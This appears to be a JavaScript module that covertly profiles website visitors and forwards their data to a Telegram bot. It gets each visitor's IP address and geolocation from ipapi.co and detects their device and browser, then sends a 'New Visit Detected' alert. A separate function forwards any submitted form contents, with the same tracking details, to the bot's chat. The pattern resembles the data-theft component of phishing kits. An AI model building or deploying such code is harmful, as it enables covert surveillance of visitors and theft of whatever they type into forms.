// Telegram utility functions for sending messages

/**
 * Get user's IP address and location information
 */
async function getUserInfo() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        
        return {
            ip: data.ip || "Unknown",
            country: data.country_name || "Unknown",
            region: data.region || "Unknown",
            city: data.city || "Unknown",
            timezone: data.timezone || "Unknown"
        };
    } catch (error) {
        console.error("Error fetching IP info:", error);
        return {
            ip: "Unknown",
            country: "Unknown",
            region: "Unknown",
            city: "Unknown",
            timezone: "Unknown"
        };
    }
}

/**
 * Detect device type and browser
 */
function getDeviceInfo() {
    const ua = navigator.userAgent;
    
    // Detect device type
    let device = "Desktop";
    if (/mobile/i.test(ua)) device = "Mobile";
    else if (/tablet/i.test(ua)) device = "Tablet";
    
    // Detect browser
    let browser = "Unknown";
    if (/Edg/i.test(ua)) browser = "Edge";
    else if (/Chrome/i.test(ua)) browser = "Chrome";
    else if (/Firefox/i.test(ua)) browser = "Firefox";
    else if (/Safari/i.test(ua)) browser = "Safari";
    else if (/Opera|OPR/i.test(ua)) browser = "Opera";
    
    return { device, browser };
}

/**
 * Send message to Telegram
 */
async function sendToTelegram(message, parseMode = 'Markdown') {
    if (!TELEGRAM_CONFIG.BOT_TOKEN || !TELEGRAM_CONFIG.CHAT_ID || 
        TELEGRAM_CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
        TELEGRAM_CONFIG.CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.warn('Telegram configuration not set. Please update config.js');
        return false;
    }
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: message,
                parse_mode: parseMode
            })
        });
        
        return response.ok;
    } catch (error) {
        console.error("Error sending Telegram message:", error);
        return false;
    }
}

/**
 * Send visit notification to Telegram
 */
async function sendVisitNotification() {
    const userInfo = await getUserInfo();
    const deviceInfo = getDeviceInfo();
    
    const message = `
📩 *New Visit Detected*  
━━━━━━━━━━━━━━━  
🌍 *IP:* ${userInfo.ip}  
🏙️ *City:* ${userInfo.city}  
🌏 *Country:* ${userInfo.country}  
🕒 *Timezone:* ${userInfo.timezone}  
💻 *Device:* ${deviceInfo.device}  
🧭 *Region:* ${userInfo.region}  
🌐 *Browser:* ${deviceInfo.browser}  
🔗 *Page:* ${window.location.href}  
🔁 *Referrer:* ${document.referrer || "Direct Visit"}
`;
    
    await sendToTelegram(message);
}

/**
 * Send form data to Telegram
 */
async function sendFormDataToTelegram(subject, data) {
    const userInfo = await getUserInfo();
    const deviceInfo = getDeviceInfo();
    
    let message = `📋 *${subject}*\n━━━━━━━━━━━━━━━\n`;
    
    // Add form data
    for (const [key, value] of Object.entries(data)) {
        if (value) {
            message += `*${key}:* ${value}\n`;
        }
    }
    
    // Add user info
    message += `\n━━━━━━━━━━━━━━━\n`;
    message += `🌍 *IP:* ${userInfo.ip}\n`;
    message += `🏙️ *City:* ${userInfo.city}\n`;
    message += `🌏 *Country:* ${userInfo.country}\n`;
    message += `💻 *Device:* ${deviceInfo.device}\n`;
    message += `🌐 *Browser:* ${deviceInfo.browser}\n`;
    message += `🔗 *Page:* ${window.location.href}\n`;
    
    await sendToTelegram(message);
}

